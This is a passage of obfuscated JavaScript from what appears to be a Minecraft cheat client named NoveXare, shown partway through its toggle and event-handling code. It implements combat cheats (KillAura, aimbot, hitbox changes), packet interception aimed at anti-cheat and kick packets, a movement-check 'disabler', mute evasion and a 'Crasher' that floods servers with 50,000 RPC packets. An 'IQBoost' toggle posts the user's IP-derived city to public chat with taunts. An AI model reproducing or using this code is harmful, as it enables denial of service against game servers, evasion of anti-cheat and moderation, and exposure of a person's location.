            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 加载成功，共" + _0x265485 + "条配置");
          }
        }
      });
    }
    if (_0x5898b8.key === "SelectRPC") {
      const _0x1629ea = {
        type: "form",
        title: "PyRpc列表",
        content: "选择PyRpc",
        buttons: [{
          text: "没有PyRpc"
        }]
      };
      let _0x2571a9 = JSON.parse(read_file(getResource() + "/NoveXare/PyRpc_Record.json"));
      for (let _0x384fbe = 0; _0x384fbe < _0x2571a9.length; _0x384fbe++) {
        _0x1629ea.buttons[_0x384fbe] = {
          text: (_0x2571a9[_0x384fbe].type == "Send" ? "§a" : "§c") + _0x2571a9[_0x384fbe].packet_str
        };
      }
      const _0x36ceb3 = JSON.stringify(_0x1629ea);
      addForm(_0x36ceb3, function (_0x532d3a) {
        var _0x48bcea = {
          id: _0x2571a9[_0x532d3a].id,
          data: _0x2571a9[_0x532d3a].packet_hex
        };
        last_PyRpc = _0x48bcea;
        if (FuncTip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 已设置上一条PyRpc");
        }
      });
    }
    if (_0x5898b8.key === "add_range_whitelist") {
      var _0x368feb = getPlayerList();
      var _0xcb1a44 = 0;
      for (let _0xba34aa of _0x368feb) {
        const _0x40f16e = getEntityPos(_0xba34aa);
        const _0x30e85a = getDistance(_0x40f16e, getEntityPos(self_id));
        if (!white_list.includes(_0xba34aa) && _0x30e85a < whilelist_range && _0xba34aa != self_id) {
          white_list.push(_0xba34aa);
          _0xcb1a44++;
        }
      }
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 已添加" + _0xcb1a44 + "个玩家到白名单");
      }
    }
    if (_0x5898b8.key === "KickSelf") {
      for (let _0x1c5074 = 0; _0x1c5074 < 1000; _0x1c5074++) {
        attack(self_id, AttackSwing);
      }
    }
    if (_0x5898b8.key === "delete_ac") {
      ac_pos = [];
    }
    if (_0x5898b8.key === "cm_depart") {
      departCamera();
    }
    if (_0x5898b8.key === "cm_anchor") {
      setCameraAnchor(0, 0, 0);
    }
    if (_0x5898b8.key === "cm_reset") {
      resetCamera();
    }
    if (_0x5898b8.key === "cm_lock") {
      lockCamera();
    }
    if (_0x5898b8.key === "TPDown") {
      const _0x546980 = getEntityPos(self_id);
      setPos(_0x546980.x, _0x546980.y - 4, _0x546980.z);
    }
    if (_0x5898b8.key === "recover") {
      other_user = null;
    }
    if (_0x5898b8.key === "delete_chest") {
      chest_pos = [];
    }
    if (_0x5898b8.key === "regex" || _0x5898b8.key === "white_list") {
      EditValue(_0x5898b8.key, _0x5898b8.key === "regex" ? regex : white_list);
    }
    if (_0x5898b8.key === "add_whitelist" || _0x5898b8.key === "add_target" || _0x5898b8.key === "add_target") {
      PlayerSelector(_0x5898b8.key === "add_whitelist" ? "white_list" : "target_list", 1);
    }
    const _0x528dd0 = getEntityPos(self_id);
    if (_0x5898b8.key == "EditY") {
      setPos(_0x528dd0.x, Edit_Y, _0x528dd0.z);
    }
    if (_0x5898b8.key == "surround_particle_add") {
      surround_particle_type = Number(surround_particle_type) + 1;
    }
    if (_0x5898b8.key == "SoundPlayer_add") {
      SoundPlayer_type = Number(SoundPlayer_type) + 1;
    }
    if (_0x5898b8.key == "remove_white_list") {
      white_list = [];
    }
    if (_0x5898b8.key == "DumpList") {
      write_file(NoveXare_path + "/List.json", JSON.stringify({
        targets: target_list.map(_0x45596e => ({
          name: getEntityName(_0x45596e),
          id: _0x45596e,
          namespace: getEntityNamespace(_0x45596e)
        })),
        players: getWorldPlayerList(),
        entities: getEntityList().map(_0x5a543c => ({
          name: getEntityName(_0x5a543c),
          id: _0x5a543c,
          namespace: getEntityNamespace(_0x5a543c)
        }))
      }));
    }
    if (_0x5898b8.key === "Rusher") {
      var _0x221b82 = getDisplacement(rush_length / 6, getEntityPos(self_id), getCameraRotation());
      setMotion(_0x221b82.x - _0x528dd0.x, _0x221b82.y - _0x528dd0.y, _0x221b82.z - _0x528dd0.z);
    }
    if (key == "key") {
      continue;
    }
    if (_0x5898b8.index != undefined) {
      func_mode[key] = _0x5898b8.index - 1;
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r " + key + " §7>>>§r SetMode §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0x5898b8[key]);
      }
      NoveXare_Config[key] = _0x5898b8.index - 1;
      return true;
    }
    if (key == "KickAura") {
      callModule(41, "{\"array_list\":" + b2s(!_0x5898b8[key]) + "}");
      if (KickAura_multi) {
        callModule(35, "{\"value\":" + b2s(_0x5898b8[key]) + ",\"count\":" + KickAura_times + "}");
      }
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":9}");
    }
    if (key === "FakeMove") {
      if (_0x5898b8[key]) {
        fakemove_pos = getEntityPos(self_id);
      } else if (!_0x5898b8[key]) {
        MenuTP(fakemove_pos.x, fakemove_pos.y, fakemove_pos.z);
      }
      callModule(41, "{\"array_list\":" + b2s(!_0x5898b8[key]) + "}");
      var _0x203caf = {
        enable: !_0x5898b8[key],
        index: 19,
        packet: "receive"
      };
      let _0x555af5 = _0x203caf;
      var _0x5c4ea8 = {
        enable: false,
        index: 19,
        packet: "send"
      };
      callModule(7, JSON.stringify(_0x5c4ea8));
      MenuTP(_0x528dd0.x + 1000, _0x528dd0.y + 1000, _0x528dd0.z + 1000);
      callModule(7, JSON.stringify({
        enable: true,
        index: 19,
        packet: "send"
      }));
      callModule(7, JSON.stringify(_0x555af5));
      setTimeout(() => MenuTP(fakemove_pos.x + 15, fakemove_pos.y + 15, fakemove_pos.z + 15), 1000);
    }
    if (key == "Crasher") {
      callModule(41, "{\"array_list\":" + b2s(!_0x5898b8[key]) + "}");
      if (Crasher_multi) {
        callModule(35, "{\"value\":" + b2s(_0x5898b8[key]) + ",\"count\":" + Crasher_times + "}");
      }
      if (func_mode.Crasher_mode === 0) {
        callModule(68, "{\"value\":" + b2s(_0x5898b8[key]) + ",\"multipleRpc\":true,\"particle\":false,\"forwardRpc\":true,\"count\":50000,\"antiPacket\":true}");
        callModule(69, "{\"0\":true,\"1\":true,\"2\":true,\"3\":true,\"4\":true,\"5\":true,\"6\":true,\"7\":true,\"8\":true,\"speed\":0,\"value\":" + b2s(_0x5898b8[key]) + "}");
      }
      if (func_mode.Crasher_mode === 5 || func_mode.Crasher_mode === 4) {
        callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":9}");
      }
    }
    if (key == "Bhop" && !_0x5898b8[key]) {
      setEntityAttribute(self_id, "minecraft:movement", record_speed);
    }
    if (key == "InfiniteAura" && InfiniteAura_repeat) {
      callModule(35, "{\"value\":" + b2s(_0x5898b8[key]) + ",\"count\":" + InfiniteAura_packet + "}");
    }
    if (key == "FlashBack") {
      removeEntity(getLocalPlayerUniqueID());
    }
    let _0x56a7cf = {
      no_practice: 25,
      no_latitude: 61,
      no_shake: 159,
      no_camera: 73,
      no_event: 65,
      no_title: 88,
      no_time: 10,
      no_ping: 115,
      no_skin: 93,
      no_sore: 107,
      no_animation: 44,
      no_bossbar: 74,
      no_sound: 86,
      no_server: 85,
      no_ground: 39,
      no_move: 40,
      no_chat: 9,
      no_start: 11,
      no_anticheat: 161,
      anti_kick: 5,
      move_packet: 19,
      block_update_packet: 21,
      hotbar_packet: 30,
      interact_packet: 33,
      operate_packet: 36,
      player_input_packet: 57,
      use_item_packet: 142
    };
    if (NoPacket && _0x56a7cf[key] != undefined) {
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":" + _0x56a7cf[key] + "}");
    }
    if (Blink && _0x56a7cf[key] != undefined) {
      callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":" + _0x56a7cf[key] + "}");
    }
    if (key == "NoAnyReceive") {
      for (let _0x6133bf = 0; _0x6133bf < 305; _0x6133bf++) {
        callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":" + _0x6133bf + "}");
      }
    }
    if (key === "TimePause") {
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":19}");
    }
    if (key === "ClickTP") {
      callModule(56, "{\"reach\":255,\"value\":" + b2s(_0x5898b8[key]) + "\"");
    }
    if (key == "FreeCam" && func_mode.freecam_mode < 3) {
      var _0x2411a2 = {
        value: true,
        noclip: _0x5898b8[key],
        flying: _0x5898b8[key]
      };
      let _0x327049 = _0x2411a2;
      var _0x14f3e1 = {
        value: _0x5898b8[key]
      };
      let _0x3e857b = _0x14f3e1;
      var _0x4e85f3 = {
        enable: !_0x5898b8[key],
        index: 19,
        packet: "send"
      };
      let _0x518a07 = _0x4e85f3;
      var _0x51d715 = {
        enable: !_0x5898b8[key],
        index: 161,
        packet: "receive"
      };
      let _0x27f1d6 = _0x51d715;
      callModule(41, "{\"array_list\":" + b2s(!_0x5898b8[key]) + "}");
      callModule(1, JSON.stringify(_0x327049));
      if (func_mode.freecam_mode == 0) {
        callModule(37, JSON.stringify(_0x3e857b));
      }
      if (func_mode.freecam_mode == 1) {
        callModule(7, JSON.stringify(_0x518a07));
      }
      if (func_mode.freecam_mode == 2) {
        callModule(7, JSON.stringify(_0x27f1d6));
      }
      if (_0x5898b8[key]) {
        freecam_pos = getEntityPos(self_id);
      } else {
        setEntityPos(self_id, freecam_pos.x, freecam_pos.y, freecam_pos.z);
      }
    }
    if (key === "AvoidAttack") {
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":19");
    }
    if (key === "AvoidAttack" && _0x5898b8[key]) {
      AvoidAttack_pos = getEntityPos(self_id);
    } else if (key === "AvoidAttack" && !_0x5898b8[key]) {
      setEntityPos(self_id, AvoidAttack_pos.x, AvoidAttack_pos.y, AvoidAttack_pos.z);
    }
    if (key == "NoClip") {
      var _0x46709e = {
        value: _0x5898b8[key],
        noclip: _0x5898b8[key],
        flying: _0x5898b8[key]
      };
      let _0x3b5497 = _0x46709e;
      if (enable_bypass) {
        callModule(9, "{\"depart\":" + b2s(_0x5898b8[key]) + "}");
      }
      if (enable_disabler) {
        callModule(44, "{\"no_move_check\":" + b2s(_0x5898b8[key]) + ",\"no_fall_check\":" + b2s(_0x5898b8[key]) + ",\"value\":" + b2s(_0x5898b8[key]) + "}");
      }
      callModule(41, "{\"array_list\":" + b2s(!_0x5898b8[key]) + "}");
      callModule(1, JSON.stringify(_0x3b5497));
      callModule(7, JSON.stringify({
        enable: !_0x5898b8[key],
        index: 39,
        packet: "receive"
      }));
    }
    if (key == "BalanceTimer") {
      if (_0x5898b8[key]) {
        callModule(41, "{\"array_list\":" + b2s(!_0x5898b8[key]) + "}");
        callModule(37, "{\"value\":true}");
        BalanceTimer_st = false;
      } else {
        callModule(37, "{\"value\":false}");
        callModule(30, "{\"value\":true}");
        BalanceTimer_st = true;
      }
    }
    if (typeof _0x5898b8[key] == "boolean" || typeof _0x5898b8[key] == "number") {
      if (target_list.length > 0) {
        if (key == "HitBox_x") {
          temp_size.x = _0x5898b8[key];
        }
        if (key == "HitBox_y") {
          temp_size.y = _0x5898b8[key];
        }
      }
      if (target_list.length > 0 && key == "HitBox" && _0x5898b8[key]) {
        default_size = temp_size;
      }
      if (key == "IQBoost") {
        let _0x8702c5 = getRandomNum(1, 5);
        let _0x2bca81 = getPlayerBlockPos(self_id);
        if (_0x8702c5 == 1) {
          curl_get("https://ip.useragentinfo.com/json?ip=", {}, function (_0x41894d, _0x1733d1) {
            const _0xe09ac1 = JSON.parse(_0x1733d1);
            sendChatMessage("!我是呱比，你们都是fvv LLL，有种就来" + _0xe09ac1.province + _0xe09ac1.city + _0xe09ac1.area + "真实我");
          });
        } else if (_0x8702c5 == 2) {
          sendChatMessage("!你可以告诉我NoveXare怎么用吗，在我的世界上，求求");
        } else if (_0x8702c5 == 3) {
          sendChatMessage("!同款科技获取+");
        } else if (_0x8702c5 == 4) {
          sendChatMessage("!我在[" + _0x2bca81.x + ", " + _0x2bca81.y + ", " + _0x2bca81.z + "]，你们都是彩笔，不服来击杀我");
        } else if (_0x8702c5 == 5) {
          sendChatMessage("!大开等于小开等于没开，我的小名叫dream，你们这群绿色玩家等着被我黄玮吉抽打吧");
        }
      }
      if (key == "auto_target" && !_0x5898b8[key]) {
        target_list = [];
      }
      if (key == "SoundPlayer" && !_0x5898b8[key]) {
        sound_data = [];
      }
      if (key == "FightBot" && !_0x5898b8[key]) {
        if (FightBot_KillAura) {
          KillAura = false;
        }
        if (FightBot_aimbot) {
          AssistAim = false;
        }
        if (FightBot_KeepDistance) {
          KeepDistance = false;
        }
        if (FightBot_Scaffold) {
          Scaffold = false;
        }
      }
      if (key == "ShowSendPacket" && !_0x5898b8[key] && packetlist.send != {}) {
        var _0x5ce4da = "";
        for (let _0x420d3b in packetlist.send) {
          _0x5ce4da += "名称:" + _0x420d3b + "，ID:" + packetlist.send[_0x420d3b].id + "，发送数量:" + packetlist.send[_0x420d3b].count + "\n";
        }
        if (saveSendPacket) {
          write_file(NoveXare_path + "/SendPacket-" + Date.now() + ".json", JSON.stringify(packetlist.send, null, 2));
        }
        clientMessage("§3§l[NoveXare] §r§7>>> §rSendPacket §7>>>§r \n" + _0x5ce4da);
      }
      if (key == "ShowReceivePacket" && !_0x5898b8[key] && packetlist.receive != {}) {
        var _0x5ce4da = "";
        for (let _0x3e69cb in packetlist.receive) {
          _0x5ce4da += "名称:" + _0x3e69cb + "，ID:" + packetlist.receive[_0x3e69cb].id + "，接受数量:" + packetlist.receive[_0x3e69cb].count + "\n";
        }
        if (saveReceivePacket) {
          write_file(NoveXare_path + "/ReceivePacket-" + Date.now() + ".json", JSON.stringify(packetlist.receive, null, 2));
        }
        clientMessage("§3§l[NoveXare] §r§7>>> §rReceivePacket §7>>>§r \n" + _0x5ce4da);
      }
      const _0x230fc4 = getCarried(self_id);
      if (key == "FakeLag") {
        if (func_mode.FakeLag_mode == 0) {
          callModule(37, "{\"value\":" + _0x5898b8[key] + "}");
        }
        if (func_mode.FakeLag_mode == 1) {
          callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":19}");
        }
        if (func_mode.FakeLag_mode == 2) {
          callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x5898b8[key]) + ",\"index\":19}");
        }
      }
      if (key === "Scaffold" && keep_y && _0x5898b8[key]) {
        rec_y = 0;
      }
      if (key === "surround_loop" && !_0x5898b8[key]) {
        sound_file = null;
      }
      if (key === "Velocity" && _0x5898b8[key]) {
        record_speed = getEntityAttribute(self_id, "minecraft:movement");
      } else if (key === "Velocity" && !_0x5898b8[key]) {
        setEntityAttribute(self_id, "minecraft:movement", record_speed);
      }
      if (key === "NoLiquid" && _0x5898b8[key]) {
        record_water = getEntityAttribute(self_id, 2);
        record_lava = getEntityAttribute(self_id, 6);
      } else if (key === "NoLiquid" && !_0x5898b8[key]) {
        setEntityAttribute(self_id, "minecraft:underwater_movement", record_water);
        setEntityAttribute(self_id, "minecraft:lava_movement", record_lava);
      }
      if (typeof _0x5898b8[key] == "boolean") {
        callFunc(key, _0x5898b8[key]);
      }
      globalThis[key] = _0x5898b8[key];
      NoveXare_Config[key] = _0x5898b8[key];
    }
  }
};
globalThis.onPlayerAttackEvent = function (_0x1182c1, _0x4c890d) {
  if (FakeTip && func_mode.fakeTip_mode === 2) {
    showTipMessage("§b[Relic] §r§lAttacking： §r" + getEntityName(_0x4c890d));
  }
  if (FakeTip && func_mode.fakeTip_mode === 3) {
    showTipMessage("§a§l[Kaleidoscop - 万花筒]\n§r§l正在攻击： §r" + getEntityName(_0x4c890d));
  }
  if (FakeTip && func_mode.fakeTip_mode === 4) {
    showTipMessage("§2[Heal Module] §r§l正在攻击： §r" + getEntityName(_0x4c890d));
  }
  if (TargetEdit) {
    if (first_target == null) {
      first_target = _0x4c890d;
    } else {
      if (te_all) {
        getEntityList().map(_0x32c496 => {
          if (_0x32c496 != first_target) {
            setTarget(_0x32c496, first_target, te_two);
          }
        });
      } else {
        setTarget(_0x4c890d, first_target, te_two);
      }
      first_target = null;
      clientMessage("§3§l[NoveXare] §r§7>>> §rTip §7>>>§r 设置完成");
    }
    return true;
  }
  if (ActivitySender) {
    sendChatMessage("我正在攻击" + getEntityName(_0x4c890d));
  }
  if (!attack_list.includes(_0x4c890d)) {
    attack_list.push(_0x4c890d);
  }
  if (_0x4c890d == null || _0x4c890d == last_attack_target) {
    attack_frequency++;
    isAttacking = true;
  } else {
    last_attack_target = _0x4c890d;
    attack_ticks = 0;
    real_attack = 0;
    attack_frequency = 0;
  }
  if (PVPDaLao) {
    setTitle("还是PVP大佬");
  }
  if (OtherUser) {
    other_user = _0x4c890d;
    return true;
  }
  if (CameraManager && cm_editanchor) {
    anchor_target = _0x4c890d;
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " 正在观察: " + getEntityName(_0x4c890d));
    }
    return true;
  }
  if (AttackParticle) {
    const _0x5a7836 = getEntityPos(_0x4c890d);
    const _0x84e07c = getEntitySize(_0x4c890d);
    for (let _0x2edc33 = 0; _0x2edc33 < getRandomNum(attack_particle_size, attack_particle_size + 20); _0x2edc33++) {
      drawParticle(attack_particle_type, _0x5a7836.x + getRandomNum(-_0x84e07c.x * getRandomNum(7, 10), _0x84e07c.x * getRandomNum(7, 10)) / 10, _0x5a7836.y + getRandomNum(-_0x84e07c.y * 9, _0x84e07c.y * 2) / 10, _0x5a7836.z + getRandomNum(-_0x84e07c.x * getRandomNum(7, 10), _0x84e07c.x * getRandomNum(7, 10)) / 10, 1);
    }
  }
  if (AttackSound) {
    playSound(Number(attack_sound_type), Number(attack_sound_level));
    if (gradual_up) {
      attack_sound_level = Number(attack_sound_level) + 1;
    }
    if (gradual_up) {
      attack_tick = 0;
    }
  }
  if (AttackRender) {
    const _0x4c5da2 = getDistanceByID(self_id, _0x4c890d);
    callModule(75, "{\"value\":true,\"line_width\":0.25,\"mode\":2,\"max_distance\":" + _0x4c5da2 * 1.01 + "}");
    setTimeout(() => callModule(75, "{\"value\":false}"), 200);
  }
  if (RecordInfo && click_mode) {
    let _0x1de26f = getTargetInfo(_0x4c890d);
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>> §rTargetInfo §7>>>§r \n" + _0x1de26f + "\n§r§b==============================");
    }
    if (save_to_file) {
      write_file(NoveXare_path + "/" + name + "_" + _0x4c890d + ".txt", _0x1de26f);
    }
    return true;
  }
  if (SmartWeapon) {
    let _0x76783a = [];
    for (let _0x342566 = 0; _0x342566 < 9; _0x342566++) {
      _0x76783a.push({
        slot: _0x342566,
        d: getItemDamage(self_id, _0x342566)
      });
    }
    _0x76783a.sort((_0x416af6, _0x3fcde4) => _0x3fcde4.d - _0x416af6.d);
    var _0x299642 = _0x76783a[0];
    if (_0x299642.d > 1) {
      selectPlayerInventorySlot(self_id, _0x299642.slot);
    }
  }
  if (ClickTarget) {
    if (!target_list.includes(_0x4c890d)) {
      target_list.push(_0x4c890d);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddTarget §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0x4c890d));
      }
    } else {
      target_list.splice(target_list.indexOf(_0x4c890d), 1);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r DelTarget §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0x4c890d));
      }
    }
    return true;
  }
  if (CustomKB) {
    const _0x27850c = getEntityPos(_0x4c890d);
    const _0x233303 = getEntityPos(_0x1182c1);
    const _0x5ad993 = getPlayerAngle(_0x233303, _0x27850c, "yaw_pos");
    var _0x3ea938 = {
      yaw: _0x5ad993,
      pitch: 0
    };
    const _0x1e55a4 = getDisplacement(-CustomKB_x / 2, _0x233303, _0x3ea938);
    setEntityMotion(_0x4c890d, _0x1e55a4.x - _0x233303.x, CustomKB_y, _0x1e55a4.z - _0x233303.z);
  }
  if (ClickWhiteList) {
    if (!white_list.includes(_0x4c890d)) {
      white_list.push(_0x4c890d);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddTarget §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0x4c890d));
      }
    } else {
      white_list.splice(white_list.indexOf(_0x4c890d), 1);
      if (FuncTip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r DelTarget §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0x4c890d));
      }
    }
    return true;
  }
  if (click_team && (!KillAura || team == "NoveXare")) {
    team = getTeams(getEntityName(_0x4c890d));
    if (FuncTip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r SetTeam §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + team);
    }
    return true;
  }
  if (Criticals) {
    callModule(44, "{\"value\":true}");
    setTimeout(() => callModule(44, "{\"value\":false}"), 100);
  }
  if (KillAura) {
    return getRandomNum(0, 100) < KillAura_empty + 1;
  }
};
globalThis.onClientMessageEvent = function (_0xb4f3b5) {
  if (ShowClientMessage) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r ClientMessage §7>>>" + (RainbowTip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0xb4f3b5);
  }
  if (ChatManager) {
    var _0x62a615 = false;
    for (let _0x44a9e0 of chat_keyword) {
      if (_0x62a615) {
        break;
      }
      if (_0xb4f3b5.includes(_0x44a9e0)) {
        _0x62a615 = true;
      }
    }
    return _0x62a615;
  }
  return ShowClientMessage;
};
globalThis.onSendChatMessageEvent = function (_0x17b439) {
  if (BypassMute) {
    executeCommand("me " + _0x17b439);
    return true;
  }
  if (FakeChat) {
    chatMessage(getEntityName(self_id), _0x17b439);
    return true;
  }
  if (FakeWhisper) {
    whisperMessage(getEntityName(self_id), _0x17b439);
    return true;
  }
  if (ChatSuffix && !_0x17b439.includes(edit_suffix)) {
    sendChatMessage(_0x17b439 + edit_suffix);
    return true;
  }
};
globalThis.onPlayerJumpEvent = function (_0x4350ea) {
  if (ActivitySender) {
    sendChatMessage("我正在跳跃");
  }
  if (PVPDaLao) {
    setTitle("还是什么都不知道的小白");
  }
  if (LongJump) {
    const _0x1b50b1 = getEntityMotion(_0x4350ea);
    const _0x9b3ab0 = getEntityPos(_0x4350ea);
    const _0xd306d9 = getEntityRot(_0x4350ea);
    const _0x21799b = predictEntityPos(_0x1b50b1, _0x9b3ab0, 20);
    var _0x440aff = {
      yaw: _0xd306d9.yaw,
      pitch: 0
    };
    const _0x45c27e = getDisplacement(longjump_x / 4, _0x9b3ab0, _0x440aff);
    setMotion(_0x45c27e.x - _0x9b3ab0.x, longjump_y, _0x45c27e.z - _0x9b3ab0.z);
  }
  if (BetterJump) {
    const _0x45eab1 = getEntityMotion(_0x4350ea);
    const _0x21e940 = getEntityPos(_0x4350ea);
    const _0x2290d4 = getEntityRot(_0x4350ea);
    const _0x2a8d0a = predictEntityPos(_0x45eab1, _0x21e940, getSpeed(self_id));
    const _0x2e869b = getPlayerAngle(_0x2a8d0a, _0x4350ea, "yaw_pos");
    var _0x5c0ceb = {
      yaw: _0x2e869b,
      pitch: 0
    };
    const _0x4bf9d0 = getDisplacement(0.7, _0x21e940, _0x5c0ceb);
    setMotion(_0x4bf9d0.x - _0x21e940.x, 0.32, _0x4bf9d0.z - _0x21e940.z);
  }
};
function onPyRpcReceiveEvent(_0x145b0d, _0x1bd8b6) {
  const _0x41f15c = hexToString(_0x1bd8b6).toLowerCase();
  if (PyRpcManager && packet_receive) {
    let _0x6ec3e4 = false;
    let _0x3b71b6 = false;
    const _0xde7d16 = (_0x6afcf5, _0x5d8b58) => {
      if (_0x6afcf5.length == 0) {
        return _0x5d8b58;
      }
      return _0x6afcf5.some(_0x29508f => _0x41f15c.includes(_0x29508f) === _0x5d8b58);
    };
    for (let _0x43e500 of keyword) {
      if (_0x6ec3e4) {
        break;
      }
      if (_0x41f15c.includes(_0x43e500)) {
        _0x6ec3e4 = true;
      }
    }
    for (let _0x14e259 of receive_keyword) {
      if (_0x6ec3e4) {
        break;
      }
      if (_0x41f15c.includes(_0x14e259)) {
        _0x6ec3e4 = true;
      }
    }
    for (let _0x3aaedb of keyword2) {
      if (!_0x6ec3e4) {
        break;
      }
      if (_0x41f15c.includes(_0x3aaedb)) {
        _0x6ec3e4 = false;
      }
    }
    for (let _0x35913f of receive_keyword2) {
      if (!_0x6ec3e4) {
        break;
      }
      if (_0x41f15c.includes(_0x35913f)) {
        _0x6ec3e4 = false;
      }
    }
    for (let _0xb40fb9 of tip_keyword) {
      if (_0x3b71b6) {
        break;
      }
      if (_0x41f15c.includes(_0xb40fb9)) {
        _0x3b71b6 = true;
      }
    }
    if (packet_record && PyRpcManager && (_0x3b71b6 && neglect_exclude || !_0x3b71b6)) {
      const _0x9bb699 = getResource() + "/NoveXare/PyRpc_Record.json";
      const _0xd8f706 = JSON.parse(readFile(_0x9bb699));
      var _0x4fb7a1 = {
        packet_hex: _0x1bd8b6
      };
      _0x4fb7a1.packet_format = HexToFormat(_0x1bd8b6);
      _0x4fb7a1.packet_str = hexToString(_0x1bd8b6);
      _0x4fb7a1.time = Date.now();
      _0x4fb7a1.id = _0x145b0d;
      _0x4fb7a1.type = "Receive";
      _0x4fb7a1.keyword = receive_keyword;
      _0x4fb7a1.global_keyword = keyword;
      _0x4fb7a1.intercept = _0x6ec3e4;
      _0xd8f706[_0xd8f706.length] = _0x4fb7a1;
      write_file(_0x9bb699, JSON.stringify(_0xd8f706, null, 4));
    }
    let _0x3eaa3e = "Null";
    if (func_mode.pyrpc_mode === 0) {
      _0x3eaa3e = hexToString(_0x1bd8b6);
    }
    if (func_mode.pyrpc_mode === 1) {
      _0x3eaa3e = _0x1bd8b6;
    }
    if (func_mode.pyrpc_mode === 2) {
      _0x3eaa3e = HexToFormat(_0x1bd8b6);
    }
    const _0x493ae3 = JSON.parse(readFile(getResource() + "/NoveXare/PyRpc_Config.json"));
    for (let _0x29e0d8 of _0x493ae3) {
      if (typeof _0x29e0d8 === "object") {
        if (_0x29e0d8.match_mode === 0 && _0x3eaa3e.includes(_0x29e0d8.packet) || _0x29e0d8.match_mode === 1 && _0x3eaa3e === _0x29e0d8.packet) {
          _0x3eaa3e = _0x29e0d8.remarks;
        }
      }
    }
    const _0x3268e4 = _0x6ec3e4 ? `
§3§l已拦截该PyRpc数据包
§r§e==============================
` : `
§r§e==============================
`;
    if (packet_tip && PyRpcManager && !_0x3b71b6 && (show_no_intercept && !_0x6ec3e4 || show_intercept && _0x6ec3e4)) {
      clientMessage("§3§l[NoveXare] §r§7>>> §rPyRpc - §cReceive §7>>>§r\n" + (show_pyrpc_id ? "ID: " + _0x145b0d + "\n" : "") + _0x3eaa3e + _0x3268e4);
    }
    return _0x6ec3e4;
  }
}
function onPyRpcSendEvent(_0x37e8ed, _0x3e3a97) {
  const _0x3321ed = hexToString(_0x3e3a97).toLowerCase();
  if (PyRpcManager && packet_send) {
    var _0x371bb3 = false;
    var _0x171bfa = false;
    const _0x4ea951 = (_0x3972f2, _0x332042) => {
      if (_0x3972f2.length == 0) {
        return _0x332042;
      }
      return _0x3972f2.some(_0xb4de72 => _0x3321ed.includes(_0xb4de72) === _0x332042);
    };
    for (let _0x3f7387 of keyword) {
      if (_0x371bb3) {
        break;
      }
      if (_0x3321ed.includes(_0x3f7387)) {
        _0x371bb3 = true;
      }
    }
    for (let _0x5ba677 of send_keyword) {
      if (_0x371bb3) {
        break;
      }
      if (_0x3321ed.includes(_0x5ba677)) {
        _0x371bb3 = true;
      }
    }
    for (let _0x3dc9e8 of keyword2) {
      if (!_0x371bb3) {
        break;
      }
      if (_0x3321ed.includes(_0x3dc9e8)) {
        _0x371bb3 = false;
      }
    }
    for (let _0x1c3295 of send_keyword2) {
      if (!_0x371bb3) {
        break;
      }
      if (_0x3321ed.includes(_0x1c3295)) {
        _0x371bb3 = false;
      }
    }
    for (let _0x3cd3e4 of tip_keyword) {
      if (_0x171bfa) {
        break;
      }
      if (_0x3321ed.includes(_0x3cd3e4)) {
        _0x171bfa = true;
      }
    }
    var _0x20946c = {
      id: _0x37e8ed,
      data: _0x3e3a97
    };
    if (!_0x171bfa) {
      last_PyRpc = _0x20946c;
    }
    if (packet_record && PyRpcManager && (_0x171bfa && neglect_exclude || !_0x171bfa)) {
      const _0xc4b4cf = getResource() + "/NoveXare/PyRpc_Record.json";
      const _0x381a89 = JSON.parse(readFile(_0xc4b4cf));
      var _0x41f73d = {
        packet_hex: _0x3e3a97
      };
      _0x41f73d.packet_format = HexToFormat(_0x3e3a97);
      _0x41f73d.packet_str = hexToString(_0x3e3a97);
      _0x41f73d.time = Date.now();
      _0x41f73d.id = _0x37e8ed;
      _0x41f73d.type = "Send";
      _0x41f73d.keyword = send_keyword;
      _0x41f73d.global_keyword = keyword;
      _0x41f73d.intercept = _0x371bb3 ? true : false;
      _0x381a89[_0x381a89.length] = _0x41f73d;
      write_file(_0xc4b4cf, JSON.stringify(_0x381a89, null, 4));
    }
    let _0x277ab6 = "Null";
    if (func_mode.pyrpc_mode === 0) {
      _0x277ab6 = hexToString(_0x3e3a97);
    }
